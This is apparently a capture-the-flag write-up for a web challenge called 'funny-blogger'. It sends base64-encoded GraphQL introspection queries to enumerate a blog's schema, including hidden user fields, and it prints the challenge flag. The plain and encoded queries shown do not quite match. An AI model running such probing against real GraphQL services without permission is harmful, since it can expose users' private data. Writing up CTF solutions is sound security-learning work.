# funny-blogger

After we open the page source we can see this:
```javascript
<script>
    var arr = document.URL.match(/article=([0-9]+)/)
    var article = arr[1];
    if (article >= 0) {
        console.log(article);
        var request = $.ajax({
            method: "POST",
            dataType: "json",
            url: "/query",
            contentType: "application/x-www-form-urlencoded",
            data: "query=eyJxdWVyeSI6IntcbiAgICAgICAgICAgICAgICBhbGxQb3N0c3tcbiAgICAgICAgICAgICAgICAgICAgZWRnZXN7XG4gICAgICAgICAgICAgICAgICAgIG5vZGV7XG4gICAgICAgICAgICAgICAgICAgICAgICB0aXRsZVxuICAgICAgICAgICAgICAgICAgICBib2R5XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgIn0=",
            success: function(response) {
                document.getElementById("title").innerHTML = response.data.allPosts.edges[article].node.title;
                document.getElementById("content").innerHTML = response.data.allPosts.edges[article].node.body;
            }
        })
    }
</script>
```

From this I understand that it makes a query encoded in base64. 
So I tried my own: 
```
not encoded:
{"query":"{__schema{types{name fields{name}}}}"}

encoded:
ewogICJxdWVyeSI6ICJ7IF9fc2NoZW1hIHsgdHlwZXMgeyBuYW1lIH0gfSB9Igp9
```

The output was:
```
{"data":{"__schema":{"types":[{"name":"Query","fields":[{"name":"node"},{"name":"allPosts"},{"name":"allUsers"}]},{"name":"Node","fields":[{"name":"id"}]},{"name":"ID","fields":null},{"name":"PostObjectConnection","fields":[{"name":"pageInfo"},{"name":"edges"}]},{"name":"PageInfo","fields":[{"name":"hasNextPage"},{"name":"hasPreviousPage"},{"name":"startCursor"},{"name":"endCursor"}]},{"name":"Boolean","fields":null},{"name":"String","fields":null},{"name":"PostObjectEdge","fields":[{"name":"node"},{"name":"cursor"}]},{"name":"PostObject","fields":[{"name":"id"},{"name":"title"},{"name":"body"},{"name":"authorId"},{"name":"author"}]},{"name":"Int","fields":null},{"name":"UserObject","fields":[{"name":"id"},{"name":"name"},{"name":"email"},{"name":"randomStr1ngtoInduc3P4in"},{"name":"posts"}]},{"name":"UserObjectConnection","fields":[{"name":"pageInfo"},{"name":"edges"}]},{"name":"UserObjectEdge","fields":[{"name":"node"},{"name":"cursor"}]},{"name":"__Schema","fields":[{"name":"types"},{"name":"queryType"},{"name":"mutationType"},{"name":"subscriptionType"},{"name":"directives"}]},{"name":"__Type","fields":[{"name":"kind"},{"name":"name"},{"name":"description"},{"name":"fields"},{"name":"interfaces"},{"name":"possibleTypes"},{"name":"enumValues"},{"name":"inputFields"},{"name":"ofType"}]},{"name":"__TypeKind","fields":null},{"name":"__Field","fields":[{"name":"name"},{"name":"description"},{"name":"args"},{"name":"type"},{"name":"isDeprecated"},{"name":"deprecationReason"}]},{"name":"__InputValue","fields":[{"name":"name"},{"name":"description"},{"name":"type"},{"name":"defaultValue"}]},{"name":"__EnumValue","fields":[{"name":"name"},{"name":"description"},{"name":"isDeprecated"},{"name":"deprecationReason"}]},{"name":"__Directive","fields":[{"name":"name"},{"name":"description"},{"name":"locations"},{"name":"args"}]},{"name":"__DirectiveLocation","fields":null}]}}}
```

If I try:
```
{"query": "{ allUsers { edges { node { randomStr1ngtoInduc3P4in } } } }"}
```
I get the try harder message flag.

However since this ctf is made by `Lucian Ioan Nitescu` I was sure it was just a troll. So I scrolled down until I found tha actuall flag.

flag: `ECSC{b8e9be2eb35748a0aa3d7a4077d1da7c3768da15e61698ec83ee6d8074ce7cdd}`